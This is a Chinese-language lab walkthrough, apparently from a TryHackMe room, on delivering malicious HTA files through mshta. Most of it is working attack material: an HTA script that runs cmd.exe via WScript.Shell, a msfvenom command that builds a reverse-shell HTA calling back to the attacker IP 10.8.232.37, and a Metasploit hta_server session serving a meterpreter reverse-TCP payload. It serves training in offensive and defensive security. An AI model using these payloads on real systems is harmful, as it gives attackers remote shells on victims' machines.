HTA 代表“HTML 应用程序”。它允许您创建一个可下载文件，其中包含有关如何显示和渲染的所有信息。 HTML 应用程序，也称为 HTA，是包含 JScript 和 VBScript 的动态 HTML 页面。 LOLBINS（Living-of-the-land Binaries）工具mshta用于执行HTA文件。它可以自行执行或从 Internet Explorer 自动执行。
在下面的示例中，我们将在有效负载中使用 ActiveXObject 作为执行 cmd.exe 的概念证明。考虑以下 HTML 代码。
```javascript
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```
在受害计算机上，使用 Microsoft Edge 访问恶意链接，http://10.8.232.37:8090/payload.hta。请注意，10.8.232.37 是 AttackBox 的 IP 地址。
![[Pasted image 20240507165651.png]]
一旦我们按下“运行”，payload.hta 就会被执行，然后它将调用 cmd.exe。下图说明我们已经成功执行了cmd.exe.
![[Pasted image 20240507165717.png]]
我们可以创建一个反向 shell  payload
```
user@machine$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Final size of hta-psh file: 7692 bytes Saved as: thm.hta
```
我们使用 Metasploit 框架中的 msfvenom 生成恶意负载以连接回攻击机器。我们使用以下有效负载将 windows/x64/shell_reverse_tcp 连接到我们的 IP 和侦听端口。

通过 Metasploit 的恶意 HTA
--
还有另一种方法可以使用 Metasploit 框架生成和提供恶意 HTA 文件。首先，使用 msfconsole -q 命令运行 Metasploit 框架。在exploit部分下有exploit/windows/misc/hta_server，需要选择并设置LHOST、LPORT、SRVHOST、Payload等信息，最后执行exploit来运行该模块。
```
msf6 > use exploit/windows/misc/hta_server msf6 exploit(windows/misc/hta_server) > set LHOST 10.8.232.37 LHOST => 10.8.232.37 msf6 exploit(windows/misc/hta_server) > set LPORT 443 LPORT => 443 msf6 exploit(windows/misc/hta_server) > set SRVHOST 10.8.232.37 SRVHOST => 10.8.232.37 msf6 exploit(windows/misc/hta_server) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp msf6 exploit(windows/misc/hta_server) > exploit [*] Exploit running as background job 0. [*] Exploit completed, but no session was created. msf6 exploit(windows/misc/hta_server) > [*] Started reverse TCP handler on 10.8.232.37:443 [*] Using URL: http://10.8.232.37:8080/TkWV9zkd.hta [*] Server started.
```
在受害计算机上，一旦我们访问 Metasploit 作为 URL 提供的恶意 HTA 文件，我们应该会收到反向连接。
